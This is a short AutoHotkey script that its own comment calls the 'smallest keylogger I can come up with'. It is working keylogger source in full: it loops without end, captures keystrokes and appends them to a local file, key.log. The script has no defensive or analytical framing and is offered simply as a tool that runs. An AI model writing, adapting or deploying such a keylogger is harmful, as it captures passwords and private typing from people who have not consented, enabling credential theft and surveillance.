Loop {  ;  Smallest keylogger I can come up with. Key strokes are saved to key.log, opens in notepad.
	Input, key, V I C M T5,
	FileAppend, %key%, key.log
}
